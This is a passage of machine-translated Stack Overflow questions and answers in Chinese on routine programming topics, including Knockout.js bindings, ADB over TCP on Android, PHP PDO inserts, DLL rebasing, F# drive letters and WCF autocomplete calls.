    </http:inbound-endpoint>

    <!-- Transform input of ProcessPayment to input of GetGeoIP -->
    <mulexml:xslt-transformer>
        <mulexml:xslt-text>
            <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
              xmlns:web="http://www.webservicex.net/">
              <xsl:template match="/">
                <web:GetGeoIP>
                   <web:IPAddress><xsl:value-of select="//paymentType_req" /></web:IPAddress>
                </web:GetGeoIP>
              </xsl:template>
            </xsl:stylesheet>
        </mulexml:xslt-text>
    </mulexml:xslt-transformer>

    <mule:message-properties-transformer>
        <mule:add-message-property key="SOAPAction" value="http://www.webservicex.net/GetGeoIP" />
    </mule:message-properties-transformer>

    <http:outbound-endpoint address="http://www.webservicex.net/geoipservice.asmx"
        exchange-pattern="request-response">
        <cxf:proxy-client soapVersion="1.2" />
    </http:outbound-endpoint>

    <!-- Transform response of GetGeoIP in response of ProcessPayment -->
    <mulexml:xslt-transformer>
        <mulexml:xslt-text>
            <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
              xmlns:pp="http://processpayment.icp.sf/" xmlns:web="http://www.webservicex.net/">
              <xsl:template match="/">
                <pp:return>
                   <billingID_res>fake billingID_res</billingID_res>
                   <paymentID_res>fake paymentID_res</paymentID_res>
                   <paymentType_res><xsl:value-of select="//web:CountryName"/></paymentType_res>
                </pp:return>
              </xsl:template>
            </xsl:stylesheet>
        </mulexml:xslt-text>
    </mulexml:xslt-transformer>
</mule:flow> 
```

# knockout.js - 是否可以对布尔 ViewModel 属性的否定（“！”）可见的数据绑定？

> ID：10114472
> 
> 赞同：164
> 
> 时间：2012-04-11T21:47:33.697
> 
> 标签：knockout.js

我想在我的 ViewModel 上使用一个属性来切换要显示的图标，而无需创建单独的逆计算属性。这可能吗？

```
<tbody data-bind="foreach: periods">
  <tr>
    <td>
      <i class="icon-search" data-bind="visible: !charted, click: $parent.pie_it"></i>
      <i class="icon-remove" data-bind="visible: charted, click: $parent.pie_it"></i>
    </td>
  </tr>
</tbody> 
```

我的 ViewModel 有一个属性 period 是月份数组，如下所示：

```
var month = function() {
    this.charted = ko.observable(false);
}; 
```

* * *

## 回答 #1

> 赞同：286
> 
> 时间：2012-04-11T21:58:14.510

在表达式中使用 observable 时，您需要将其作为函数访问，例如：

`visible: !charted()`

* * *

## 回答 #2

> 赞同：53
> 
> 时间：2012-05-13T17:35:57.823

我同意 John Papa 的评论，即应该有一个内置`hidden`绑定。`hidden`专用绑定有两个好处：

1.  更简单的语法，即。`hidden: charted`而不是`visible: !charted()`.
2.  资源更少，因为 Knockout 可以`charted`直接观察 observable，而不是创建一个`computed`to observe `!charted()`。

`hidden`但是，创建绑定很简单，如下所示：

```
ko.bindingHandlers.hidden = {
  update: function(element, valueAccessor) {
    ko.bindingHandlers.visible.update(element, function() {
      return !ko.utils.unwrapObservable(valueAccessor());
    });
  }
}; 
```

您可以像使用内置`visible`绑定一样使用它：

```
<i class="icon-search" data-bind="hidden: charted, click: $parent.pie_it"></i>
<i class="icon-remove" data-bind="visible: charted, click: $parent.pie_it"></i> 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2013-01-04T17:29:02.513

这有点令人困惑，因为你必须这样做

```
visible:!showMe() 
```

所以我做了

```
<span data-bind="visible:showMe">Show</span>
<span data-bind="visible:!showMe()">Hide</span>
<label><input type="checkbox" data-bind="checked:showMe"/>toggle</label>​ 
```

我的模型是

```
var myModel={
    showMe:ko.observable(true)
}
ko.applyBindings(myModel); 
```

​签入小提琴[http://jsfiddle.net/khanSharp/bgdbm/](http://jsfiddle.net/khanSharp/bgdbm/)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-08-28T20:40:33.650

你可以使用我的[switch/case](https://github.com/mbest/knockout-switch-case)绑定，其中包括`case.visible`和`casenot.visible`.

```
<tbody data-bind="foreach: periods">
    <tr>
        <td data-bind="switch: true">
        <i class="icon-search" data-bind="case.visible: $else, click: $parent.pie_it"></i>
        <i class="icon-remove" data-bind="case.visible: charted, click: $parent.pie_it"></i>
        </td>
    </tr>
</tbody> 
```

你也可以把它当作

```
 <i class="icon-search" data-bind="casenot.visible: charted, click: $parent.pie_it"></i>
        <i class="icon-remove" data-bind="case.visible: $else, click: $parent.pie_it"></i> 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-14T10:19:27.227

为了让绑定知道属性的变化，我复制了可见的绑定处理程序并将其反转：

```
ko.bindingHandlers.hidden = {
    update: function (element, valueAccessor) {
        var value = ko.utils.unwrapObservable(valueAccessor());
        var isCurrentlyHidden = !(element.style.display == "");
        if (value && !isCurrentlyHidden)
            element.style.display = "none";
        else if ((!value) && isCurrentlyHidden)
            element.style.display = "";
    }
}; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-04-17T14:44:25.623

免责声明：此解决方案仅用于娱乐目的。

```
ko.extenders.not = function (target) {
    target.not = ko.computed(function () {
        return !target();
    });
};

self.foo = ko.observable(true).extend({ not: null });

<div data-bind="text: foo"></div>     <!-- true -->
<div data-bind="text: foo.not"></div> <!-- false -->

<!-- unfortunately I can't think of a way to be able to use:
    text: foo...not
--> 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-12-07T19:30:19.993

关于如何使用与布尔可观察对象相反的问题，我遇到了同样的问题。我找到了一个简单的解决方案：

```
var ViewModel = function () {
var self = this;

// When program start, this is set to FALSE
self.isSearchContentValid = ko.observable(false);

self.gatherPlacesData = function () {

   // When user click a button, the value become TRUE
   self.isSearchContentValid(true);

}; 
```

现在在你的 HTML 上你应该这样做

```
<p data-bind = "visible:isSearchContentValid() === false"> Text 1</p>
<p data-bind = "visible:isSearchContentValid"> Text 2</p> 
```

当程序启动时，只有“Text1”可见，因为“false===false 为 TRUE”，而 Text2 不可见。

假设我们有一个按钮，它在点击事件时调用gatherPlacesData。现在 Text1 将不可见，因为“true === false is FALSE”并且 Text 2 仅可见。

另一种可能的解决方案可能是使用计算的 observable，但我认为对于一个如此简单的问题来说这是一个过于复杂的解决方案。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2017-05-31T08:04:42.163

也可以像这样使用**隐藏**：

```
 <div data-bind="hidden: isString">
                            <input type="text" class="form-control" data-bind="value: settingValue" />
                        </div> 
```

# android - setprop 不会在有根的 Android 手机上设置属性

> ID：10114478
> 
> 赞同：5
> 
> 时间：2012-04-11T21:48:12.503
> 
> 标签：android

我正在开发一个应用程序（使用 Eclipse + Android SDk/NDK），它使用 android 手机上的 micro-usb 端口连接到外围设备。我正在尝试通过 WiFi（tcp 端口 5555）连接到手机上的 ADB 守护程序，以便可以在 Eclipse 中调试我的应用程序。但是，我无法让它工作。

我没有尝试实际导致手机上的 ADB 守护进程切换到 TCPIP 模式（据我通过查看 的输出可知`getprop`）。问题似乎是我无法`service.adb.tcp.port`在手机上设置相关属性。我使用的开发手机是运行 CyanogenMod 7.0.0 (Android v2.3.3) 的 LG GT540。开发机器是运行 OS X Lion 的 iMac。

以下是有关我尝试/确认/发现的一些相关信息：

*   手机已root ( `ru.secure = 0`)
*   通过 USB 连接到 ADB 工作正常
*   Mac 上的 adb 服务以 root ( `adb root`)身份运行
*   `adb shell`给我一个具有超级用户访问权限的 shell（# 提示符、su、编辑系统文件的能力等）
*   `adb tcpip 5555`从 Mac 上的终端窗口运行时不会抱怨或抛出错误，但不会`service.adb.tcp.port`在手机上设置属性
*   `setprop service.adb.tcp.port 5555`在手机终端窗口的#提示符下输入不会抱怨或抛出错误但不会设置`service.adb.tcp.port`属性
*   `setprop persist.service.adb.enable 0`适用于 Mac 和手机外壳（通过检查 ADB 守护进程停止并`getprop`为启用属性返回 0 来确认）
*   `setprop persist.service.adb.enable 1`在 Mac 和手机外壳上都可以正常工作（通过检查 ADB 守护程序启动并`getprop`为启用属性返回 1 来确认）
*   手机上与手机上的 ADB 相关的唯一属性是`persist.service.adb.enable`和`init.svc.adbd`（如果 ADB 正在运行）（由`getprop | grep adb`手机上确认）
*   市场上声称“自动”配置 ADB for Wifi（例如[WiFi ADB](http://www.appbrain.com/app/wifi-adb/com.ttxapps.wifiadb)）的应用程序也不起作用（`tcp.port`属性未设置且 ADB over TCP 不起作用）

我在这里看起来太努力了，错过了一些明显的东西吗？互联网上有很多关于让 ADB 通过 TCP 工作的问题的帖子和文章，但它们都与电话 root 问题有关。

是否有人能够阐明为什么我似乎无法设置此特定属性或提出任何其他可能阻止 ADB 守护程序在 TCPIP 模式下运行的问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-02-18T04:56:08.863

对于任何设备（无论是否植根），它都应该非常简单：

1.  连接到 USB
2.  跑`adb tcpip <port>`

如果它工作，你会看到`restarting in TCP mode port: <port>`吐出终端。如果你什么也没看到，那就是没有。

该属性由守护程序为您设置。指导您设置属性并重新启动 adbd 的教程侧重于需要在设备上执行的代码（即，如果您正在通过 WiFi 应用程序编写 ADB）。

**但是，您提到您正在使用 Cyanogenmod。**CM 在开发人员选项中没有“ADB over Network”设置吗（我发誓它在 CM7 中有）？我知道他们选择的端口是 5555。您可能会在尝试手动执行该功能时遇到冲突。可能最好使用系统内置的东西（如果有的话）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-18T04:21:58.427

您需要在手机上停止然后重新启动 adbd 才能使 tcp 端口属性生效。

*   setprop service.adb.tcp.port 5555
*   停止 adbd
*   启动 adbd

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-03-24T09:50:50.393

在应用程序开始时添加 1 行。

```
setprop service.adb.tcp.port 5555 && stop adbd && start adbd 
```

这会在启动时重置 adb！

# html - 如何在 HTML5 画布中使用 getImageData 获取子图像的子图像

> ID：10114481
> 
> 赞同：0
> 
> 时间：2012-04-11T21:48:24.477
> 
> 标签：html, canvas

使用 HTML5 画布，您可以轻松获取图像的子图像。如下：

var imageData = context.getImageData(5, 5, 10, 10); var d = imageData.data

但是，似乎没有办法获得该数据的另一个子图像。

假设我想这样做： var imageData = context.getImageData(0, 0, 2, 2) 之前返回的子图像。

这实际上是 (5, 5, 2, 2);

大多数图形库都可以递归地深入到带有子图像的图像中。帆布有类似的东西吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:14:46.400

您可以创建自己的 rect 对象并使用它来进行子选择，但直接从初始画布元素中提取数据。

就像是

```
function rect(x, y, w, h) {
    this.x = x;
    this.y = y;
    this.width = w;
    this.height = h;
}

rect.prototype.getRect = function(x, y, w, h) {
    return new rect(this.x + x, this.y + y, w, h);
};

var initial = new rect(5,5,10,10);
var second = initial.getRect(0,0,2,2); 
```

* * *

或者，您可以在内存中创建一个画布元素，绘制第一张图像，然后调用`getImageData`新的画布上下文。

# java - 具有多个参数的 CXF Web 服务

> ID：10114486
> 
> 赞同：3
> 
> 时间：2012-04-11T21:48:42.803
> 
> 标签：java, web-services, cxf, apache-camel

我正在使用 Camel 和 CXF 开发 Web 服务，并使用“代码优先”方法。对于具有单个参数的方法，一切正常。然而，具有多个参数的方法只接收第一个参数，其他方法解析为空值。不会抛出异常。

这是我的路线：

```
<route>
  <from uri="cxf:bean:serverEndPoint" />
  <log message=">>> data is : ${body}"/>
  <choice>
    <when>
      <simple>${in.header.operationName} == 'doSomething'</simple>
      <to uri="bean:TestWSBean?method=doSomething"/>
    </when>
    ...
</route> 
```

服务器端点定义如下：

```
<cxf:cxfEndpoint id="serverEndPoint"
               address="http://localhost:9000/casServer/"
               serviceClass="com.test.iface.TestWebService">
  <cxf:inInterceptors>
      <ref bean="loggingInInterceptor"/>
  </cxf:inInterceptors>                   
  <cxf:outInterceptors>
      <ref bean="loggingOutInterceptor"/>
  </cxf:outInterceptors>                   
</cxf:cxfEndpoint> 
```

以及实现 bean 本身：

```
@WebService
public interface TestWebService {
  public String doSomething(String one, String two);
} 
```

我的问题很基本，应该怎么做才能发送多个参数？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-12T05:44:38.693

我认为您将需要使用 requestwrappper 注释。查看 cxf 中 wsdl_first 示例生成的代码。它生成注释和合适的包装类。

@RequestWrapper(localName = "updateCustomer", targetNamespace = "http://customerservice.example.com/", className = "com.example.customerservice.UpdateCustomer")

# windows - REBASE.EXE 的替代品是什么？

> ID：10114492
> 
> 赞同：10
> 
> 时间：2012-04-11T21:50:02.230
> 
> 标签：windows, visual-c++, dll, rebase, winapi

我需要重新设置与我的程序一起安装的 DLL 文件组，因为它是一个 32 位程序，并且地址空间现在太碎片化了。还有一个问题是，由于与某些 DLL 的基地址冲突，整个 DLL 在冷启动时被请求分页到 RAM 中，以便加载程序可以重新设置它们的基址。一些 DLL 是我们编译的；其他人来自第 3 方。

我想要做的是有一个工具 rebase 给定的一组 DLL，以便这组 DLL 占用一个连续的内存块。然后，该工具将在安装程序编译之前运行，并且重新定位的 DLL 将安装在应用程序的私有目录中。

据我了解，Windows SDK 中包含的 REBASE.EXE 工具正是这样做的。给它一些 DLL，它会重新定义它们。

不幸的是... [Windows 8 Consumer Preview 的 Windows 软件开发工具包 (SDK)](http://msdn.microsoft.com/en-us/library/windows/hardware/hh852363.aspx)说：

> **工具**许多过时或不推荐使用的工具已从 Windows SDK 中删除。以下工具已被删除：
> 
> <snip> ReBase.exe

现在怎么办？我不想开始使用显然已经过时并且将在下一版本的 Windows 中消失的工具。假设我没看错，使用 ReBase.exe 的替代品是什么？我想限制自己使用 Windows SDK 和/或 Visual Studio 附带的工具，而不是引入 3rd-party 工具和/或编写我自己的 rebase 代码。

或者，我是否以错误的方式处理整个问题？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-11T22:01:14.823

`editbin.exe`带有 VS2010 并具有 /REBASE 选项。

```
C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC>editbin
Microsoft (R) COFF/PE Editor Version 10.00.40219.01
Copyright (C) Microsoft Corporation.  All rights reserved.

usage: EDITBIN [options] [files]

   options:

      /ALLOWBIND[:NO]
      /ALLOWISOLATION[:NO]
      /BIND[:PATH=path]
      /DYNAMICBASE[:NO]
      /ERRORREPORT:{NONE|PROMPT|QUEUE|SEND}
      /HEAP:reserve[,commit]
      /LARGEADDRESSAWARE[:NO]
      /NOLOGO
      /NXCOMPAT[:NO]
      /REBASE[:[BASE=address][,BASEFILE][,DOWN]]
      /RELEASE
      /SECTION:name[=newname][,[[!]{CDEIKOMPRSUW}][A{1248PTSX}]]
      /STACK:reserve[,commit]
      /SUBSYSTEM:{BOOT_APPLICATION|CONSOLE|EFI_APPLICATION|
                  EFI_BOOT_SERVICE_DRIVER|EFI_ROM|EFI_RUNTIME_DRIVER|
                  NATIVE|POSIX|WINDOWS|WINDOWSCE}[,#[.##]]
      /SWAPRUN:{[!]CD|[!]NET}
      /TSAWARE[:NO]
      /VERSION:#[.#] 
```

正如马克指出的那样，您需要关闭 ASLR，您可以使用`/DYNAMICBASE:no`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-11T22:00:19.283

不推荐使用 Rebase.exe 的原因是它不像以前那样有用。从 Windows Vista 开始，Microsoft 实现了[地址空间布局随机化](http://en.wikipedia.org/wiki/Security_and_safety_features_new_to_Windows_Vista#Preventing_exploits)，每次加载它们时都会移动系统 DLL，并且还可以选择移动用户 DLL。

如果你指望变基来生成一个大的连续地址空间，你会失望的。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-18T21:23:11.070

更不用说对一组文件使用“REBASE.EXE -b 0x58000000 -e 0x10000 -c coffbase.txt *.dll”，只是为了生成COFFBASE文件。
换句话说，不是因为您现在打算实际重新设置文件的基址，而是因为您想要一个准确的 COFFBASE.TXT，
以便每次构建它们时/已经/使用特定且不冲突的基地址构建它们。

# html - 使用 SpeedTracer for Google Chrome 时遇到问题

> ID：10114496
> 
> 赞同：0
> 
> 时间：2012-04-11T21:50:14.353
> 
> 标签：html, performance

[我想在这里找到这个](http://nanisolutions.us/wordpress/)网站的瓶颈。诚然，现在页面上没有太多内容，但我将在接下来的一周内将近 300 张图片上传到这个网站，我希望这会对速度和性能产生影响。因此，我想尽可能减少图像加载以外的所有内容。

我附上了一张图片，显示了我在 SpeedTracer 中看到的内容，但这些数据对我来说毫无意义。页面加载时间约为 4 秒，但这些蓝色条中的每一个都声称需要约 3.5 秒才能加载。怎么会这样？

有人可以尝试向我提供一些关于我在这里看到的内容的解释吗？

![我的观点](../Images/4b71025a7ca805d830d3131ee4f24040.png)

谢谢，

埃文

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T10:25:25.657

您正在查看的是页面的瀑布，它正在加载资源......

每行代表一个单独的资源，并显示它何时开始加载以及花费了多长时间。

浏览器可以并行下载资源——Chrome 最多可以同时从同一个主机名下载六个资源，例如 www.nanisolutions.com。它还可以同时从每个其他主机名下载多达六个资源（最多 40 个连接）

这就是为什么您的屏幕抓取显示在某些我不确定的项目之后开始的对根 HTML 文档的请求，但我想知道您是否与网络服务器在同一个网络上？

我很想使用webpagetest.org 运行相同的测试

# php - PHP PDO 准备插入 - 不插入数据并且不显示错误

> ID：10114501
> 
> 赞同：3
> 
> 时间：2012-04-11T21:50:25.240
> 
> 标签：php, mysql, insert, pdo

这个问题让我发疯，我尝试了一切。Is 没有给我任何错误，但它也没有向数据库插入任何内容。数据库连接良好，应该没有错别字。请看一下，看看是否能找到问题：

```
$err = array();

if (isset($_POST['submit'])) {

    $ip = gethostbyname($_SERVER['REMOTE_ADDR']);
    $date = "2012-02-02 02:02:02"; //Example
    $uploader_name = $_POST['uploader_name'];

    // Validation happens here...

    if (empty($err)) {

        $host = "host";
        $dbname = "db";
        $user = "user";
        $pass = "pass";

        try {
            $dbh = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);  

            $sql = "INSERT INTO `table` (`ip`, `date`, `uploader_name`) 
                    VALUES (:ip, :date, :uploader_name)";
            $stmt = $dbh->prepare($sql);

            # the data we want to insert  
            $params = array(
                ':ip' => $ip,
                ':date' => $date,
                ':uploader_name' => $uploader_name
            );

            $stmt->execute($params);

            $dbh = null;

        } catch(PDOException $pe) {
            die('SQL Error');
        }

        if (empty($err)) {
            $err[] = "Success!";
        }   
    }

} 
```

另外，我确定它会到达插入部分，因为我收到了“成功”消息。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-11T21:59:00.693

使用此代码执行您的语句。如果有非致命错误，它将显示它。

```
$stmt->execute($params) or die(print_r($stmt->errorInfo(), true)); 
```

几乎可以肯定，您的 db 用户无权执行您针对您尝试执行的表所要求的语句。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T22:00:52.853

你在使用自动提交吗？如果不是，您可能需要将查询包装在事务中。

```
try
{
    $dbh->beginTransaction();
    // your code.
    $dbh->commit();
}
catch(PDOException $pe)
{
    $dbh->rollback();
    die($pe->getMessage());
} 
```

[http://php.net/manual/en/pdo.transactions.php](http://php.net/manual/en/pdo.transactions.php)

# visual-studio-2010 - MSBuild、TeamCity、SVN：可靠定位测试/开发/实时构建/配置的最佳实践

> ID：10114503
> 
> 赞同：3
> 
> 时间：2012-04-11T21:50:40.907
> 
> 标签：visual-studio-2010, svn, msbuild, teamcity

我想知道我是否可以从人们那里得到一些关于如何最好地构建 Visual Studio 解决方案的反馈。

我的核心要求是确保任何代码/测试都针对正确的资源运行，特别是数据库模式和示例数据。

我尝试了各种方法来做到这一点，取得了不同程度的成功。目前，我……</p>

*   创建类库*.Installation.dll，用于创建、配置和填充数据库等。
*   有一个类库 *.Build.dll，它有一个 MSBuild 任务，该任务从 csproj 文件中获取参数并传递给 Installation.dll。

这些都在他们自己的解决方案中。说 MyApp.Build.sln。我将其与我的主要解决方案分开维护，以防止文件锁定问题。

在我的主要解决方案中，说 MyApp.sln ...</p>

然后，我的测试项目调用 MSBuild 任务来创建用于集成测试的测试环境，包括数据库和示例测试数据。我的 Web/Windows 前端项目调用 MSBuild 为测试用户/我的手动测试创建可运行环境

因此，我正在使用 MSBuild 创建可定制的构建/环境以进行测试/运行。此外，我可以将 Installation.dll 包装到配置/设置工具中，以便在安装时为用户自动安装。

这是一个太复杂的场景吗？我担心我过度设计了这个并忽略了一些东西。它运行良好，但受很多元编程（例如，数据库构建代码、配置、构建任务等）的约束，这些元编程不直接涉及有形的、收费的工作。

我有 SubVersion 和 TeamCity。我想最终启用在每日/提交构建触发器上调用的 CI 构建。或者我可以以这种方式使用 TeamCity 来避免重建数据库/等。每个构建？

感谢您的任何见解。

# php - 使用“is_numeric”安全读取仅包含零（“0”）的文件？

> ID：10114504
> 
> 赞同：-1
> 
> 时间：2012-04-11T21:50:41.210
> 
> 标签：php

在我的文件读取函数中，`if($theData = @fread($fh, filesize($myFile))`如果目标失败只包含零，则返回 false，因此我添加了整数检查 ( `is_numeric`)。这安全吗？

```
function readfilecontents($myFile)
{
    if($fh = @fopen($myFile, 'r'))
    {
        $theData = @fread($fh, filesize($myFile));
        if($theData || is_numeric($theData))
        {
            if(@fclose($fh))
            {
                return $theData;
            }
        }
    }
    return false;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:15:42.217

不，这不安全 - 例如，如果您正在读取一个空文件，您的函数将返回 false 而不是空字符串。但是不需要像这样的函数，因为[file_get_contents()](http://php.net/file_get_contents)做了完全相同的事情（只是更快）。

# javascript - 使用 JavaScript 进行基本 HTML 布局

> ID：10114508
> 
> 赞同：5
> 
> 时间：2012-04-11T21:51:05.380
> 
> 标签：javascript, html, layout, semantics, semantic-web

多年来，我一直在做 HTML 布局和编程，最近我看到了一个日益严重的问题。主要进行 HTML 布局的人们越来越习惯于使用 JavaScript 来解决基本的页面布局问题。他们没有考虑 HTML 能够做什么（击中他们的目标浏览器），而是在臃肿的 JS 框架上“修复”相当基本的问题。

让我们在这里解决这个问题：我发现这种做法很烦人，并且经常不考虑那些有特殊可访问性需求的人。

不幸的是，当你试图告诉这些人他们正在做的事情不是语义的、理想的，甚至可能不是一个好主意时，他们总是用同样的旧论点来反驳：“JavaScript 的市场饱和度为 98%，我们不不要在意另外 2% 的人。” 或“现在谁没有启用 JavaScript？” 或者只是“我们不关心那些用户”。我觉得这非常短视。

我想听听整个社区的意见。你怎么看，我对一个垂死的理想抱得太紧了吗？JavaScript 的流行是否是使用编程语言进行基本布局的好借口，从而破坏了您的行为和布局？jQuery 和类似的基于“行为”的框架正在模糊界限，尤其是对于那些没有意识到差异的人。

最重要的是，当“这是正确的做法”的论点不可接受时，我想要一些“论据弹药”来对付这些人。请您引用概述您的立场的消息来源吗？

谢谢大家，请文明一点：）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T21:55:56.750

我同意你的看法，但因为 2% 的原因是页面加载不一致。一旦您使用客户端功能更改布局，您在完全加载的页面和整个功能之间会有短暂的延迟。我通常会尽可能多地使用 html/css。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-11T21:58:38.723

我认为自己也是“老派”，并打算以增加用户体验的方式使用 javascript，但这不是必需的。因此，例如（不是布局，只是更容易理解）如果您没有在表单中填写必填字段，我会用 js 提醒您，但如果您关闭了 js，我仍然会在服务器端“抓住”您.

是的，只要我能尝试使用静态 html+css。一个很好的例子是：许多人使用 jquery 动画，但在某些情况下使用 css 过渡更容易/更快/更流畅。

# f# - 获取无效驱动器号列表

> ID：10114516
> 
> 赞同：1
> 
> 时间：2012-04-11T21:52:06.467
> 
> 标签：f#, sequences

```
let private GetDrives = seq{
let all=System.IO.DriveInfo.GetDrives()
for d in all do
    //if(d.IsReady && d.DriveType=System.IO.DriveType.Fixed) then
        yield d
}

let valid={'A'..'Z'}
let rec SearchRegistryForInvalidDrive (start:RegistryKey) = seq{
    let validDrives=GetDrives |> Seq.map (fun x -> x.Name.Substring(0,1))
    let invalidDrives= Seq.toList validDrives |> List.filter(fun x-> not (List.exists2 x b)) //(List.exists is the wrong method I think, but it doesn't compile 
```

我遵循[F#: Filter items found in a list from another list](https://stackoverflow.com/questions/1506280/f-filter-items-found-in-one-list-from-another-list)但无法将其应用于我的问题，因为我看到的两种解决方案似乎都无法编译。List.Contains 不存在（缺少参考？）并且 ListA - ListB 也不编译。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-11T21:56:31.927

```
open System.IO
let driveLetters = set [ for d in DriveInfo.GetDrives() -> d.Name.[0] ]
let unused = set ['A'..'Z'] - driveLetters 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-11T22:05:44.780

您的第一个错误是在`char`和之间混合`string`，最好从以下开始`char`：

```
let all = {'A'..'Z'}
let validDrives = GetDrives |> Seq.map (fun x -> x.Name.[0]) 
```

现在无效的驱动器号是那些在`all`但不在的字母`validDrives`：

```
let invalidDrives = 
      all |> Seq.filter (fun c -> validDrives |> List.forall ((<>) c)) 
```

由于`validDrives`经过多次遍历以检查成员资格，因此在此示例中将其转换为集合更好：

```
let all = {'A'..'Z'}
let validDrives = GetDrives |> Seq.map (fun x -> x.Name.[0]) |> Set.ofSeq
let invalidDrives = all |> Seq.filter (not << validDrives.Contains) 
```

# iphone - 具有频繁更新背景的滞后 UI

> ID：10114517
> 
> 赞同：2
> 
> 时间：2012-04-11T21:52:11.793
> 
> 标签：iphone, ios, multithreading, core-animation, quartz-graphics

我的应用程序有一个“主”视图、一个自定义拇指棒控件和一些按钮。主视图上定义了一个额外的 CALayer，其内容会随着流图像不断更新。一些代码：

设置 CADisplay 链接以重复调用我的绘制方法：

```
displayLink_ = [CADisplayLink displayLinkWithTarget:self selector:@selector(drawSublayers)];
[displayLink_ setFrameInterval:2];
[displayLink_ addToRunLoop:[NSRunLoop mainRunLoop] forMode:NSRunLoopCommonModes]; 
```

该方法`drawSublayers`将 CGImage 绘制为

```
 CGImageRelease((__bridge CGImageRef) imageLayer_.contents);
  [imageLayer_ setContents:(id)self.cameraImage_.CGImage]; 
```

问题是拇指杆和其他控件都非常滞后。这是因为背景图像的绘制消耗了足够多的处理器，以至于 mainRunLoop 被拖下并且无法跟上。我读过的所有帖子都表明，将任何 UI 更新移动到单独的线程都不起作用（独立测试已经证实了这一点 - 方法会触发，但不会发生绘图）。

有任何想法吗？背景图像不是优先级，即，我不介意绘制它需要一些时间。我只是不希望它干扰 UI 的其余部分。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T13:50:18.747

将您的绘图移出主线程。`performSelectorinBackground:`

[http://www.chrisumbel.com/article/asynchronous_iphone_nsthread_nstimer](http://www.chrisumbel.com/article/asynchronous_iphone_nsthread_nstimer)

# jquery - jQuery 页面滑块，基于 JSON 数据源

> ID：10114518
> 
> 赞同：0
> 
> 时间：2012-04-11T21:52:15.523
> 
> 标签：jquery, json, slider, jquery-slider

这是我在 SO 中的第一篇文章，我想达到这里显示的结果[http://builtbybuffalo.com/project/view/bored-of-southsea/date/desc](http://builtbybuffalo.com/project/view/bored-of-southsea/date/desc)

如您所见，该页面使用动态 jquery 滑块，其内容取自 JSON 源。我需要你的帮助来**理解这个过程**，稍后我会尝试重新创建这个惊人的滑块。

如您所见，如果您单击“上一个”和“下一个”按钮，则 url 页面不会更改，它会从 json 文件加载代码。

你能帮我找到这个解决方案吗？我真的很感谢你的建议。

拥抱！马可

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:09:09.147

您可以做的是使用 $.getJSON 来获取数据（它必须是格式良好的 json，请参见[http://www.json.org/](http://www.json.org/)）您希望按照幻灯片的顺序返回一个对象数组。

{“项目”：[{“拇指”：“”，“大”：“”}]}

有一个模板集，如果您只针对图像可能值得同时拥有缩略图和大图像 URL，请使用缩略图创建按钮。

您可以在每个上存储大 URL。单击一个时，如果未加载，则创建一个新的图像文件，您可以在其中加载 URL，当它准备好时，附加新创建的图像标记并在必要时进行转换。

# jquery - 为jquery自动完成设置源时如何将JSON数据传递给WCF方法

> ID：10114521
> 
> 赞同：1
> 
> 时间：2012-04-11T21:52:32.527
> 
> 标签：jquery, wcf, jquery-ui, autocomplete

我在 stackoverflow 上看到了一堆类似的帖子，但对我都没有用。我有简单的 AJAX ENABLED WCF 服务，它根据输入返回城市

```
 [OperationContract]
    public IEnumerable<string> GetCities(string prefix)
    {
        string[] cities = new[] { "New York", "Atlanta", "Los Angeles", "Las Vegas", "Arizona", "New Hampshire", "New England" };

        if(!String.IsNullOrEmpty(prefix))
        {
            cities = cities.Where(a => a.ToLower().StartsWith(prefix.ToLower())).ToArray();
        }

        return cities;
    } 
```

现在我正在尝试使用 jquery ui 的自动完成来调用此方法。问题是我必须将前缀参数传递给方法调用，但是无论我尝试什么，前缀参数都会作为查询字符串附加到 url。这是我拥有的 jQuery 代码

```
$("input[type=text][id*=autocompleteBox]").autocomplete({
    source: function (request, response) {
        var dataCity = {'prefix': request.term};
        $.ajax({
            url: "http://localhost:1939/Cities.svc/GetCities",
            dataType: "json",
            contentType: "application/json; charset=utf-8",
            data: JSON.stringify(dataCity),
            success: function (data) {
                response($.map(data, function (item) {
                    return {
                        label: data
                    }
                }));
            }
        });
    },
    minLength: 0
}); 
```

我知道我有 3 个选项可以调用远程数据源。第一个选项是上面的代码，但是这样我将字符串化的 json 结果附加到 url。

然后我尝试简单地将服务的 url 传递给源选项，但我得到了相同的结果（ term=myinput 附加到 url ）。

我不能使用第三个选项（带有本地数据的数组），因为我有很多条目，我不想将它们全部保留在客户端上。

那么如何将前缀参数传递给 Service Method 呢？这是否可能，或者如果我选择使用 jquery ui 的自动完成小部件，我必须坚持使用 url 附加参数？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-12T10:31:09.027

